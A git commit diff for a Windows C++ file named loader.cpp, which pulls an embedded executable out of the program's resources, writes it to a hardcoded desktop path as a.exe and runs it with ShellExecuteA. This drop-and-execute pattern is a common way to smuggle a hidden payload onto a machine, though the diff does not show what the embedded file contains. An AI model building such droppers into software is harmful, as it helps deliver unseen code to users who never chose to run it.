592a6c386365b279631a6a1641e9c3ac326f3bee
alexblack-ui <72016017+alexblack-ui@users.noreply.github.com>
2021-01-21 17:42:33 +0200

    Update loader.cpp

--- loader.cpp
+++ loader.cpp
@@ -1,15 +1,41 @@
-#include <iostream>
-#include <io.h>
-#include <fcntl.h>
 #include <Windows.h>
 
 int main()
 {
-    HRSRC hRes = FindResource(nullptr, MAKEINTRESOURCE(10), RT_RCDATA);
-    HGLOBAL hGlob = LoadResource(nullptr, hRes);
+    HRSRC hrsrc;
+    hrsrc = FindResource(nullptr, MAKEINTRESOURCE(10), RT_RCDATA);
+    HGLOBAL hGlbl = nullptr;
+    BYTE * pExeResource = nullptr;
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    DWORD size = 72704;
 
-    BYTE* pData = (BYTE*)LockResource(hGlob);
+    if (hrsrc == nullptr)
+    {
+        return FALSE;
+    }
 
-    DWORD dwFileSize = SizeofResource(nullptr, hRes);
-    int hFile = open("test.exe", O_BINARY | O_CREAT | O_WRONLY);
+    hGlbl = LoadResource(nullptr, hrsrc);
+
+    if (hGlbl == nullptr)
+    {
+        return FALSE;
+    }
+
+    pExeResource = (BYTE*)LockResource(hGlbl);
+
+    if (pExeResource == nullptr)
+    {
+        return FALSE;
+    }
+
+    hFile = CreateFileA("C:\\Users\\Zver\\Desktop\\a.exe", GENERIC_WRITE | GENERIC_READ, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+
+    if (hFile != INVALID_HANDLE_VALUE)
+    {
+        DWORD bytesWritten = 0;
+        WriteFile(hFile, pExeResource, size, &bytesWritten, nullptr);
+        CloseHandle(hFile);
+    }
+    ShellExecuteA(nullptr, "open", "C:\\Users\\Zver\\Desktop\\a.exe", nullptr, nullptr, SW_SHOWNORMAL);
+    return 0;
 }
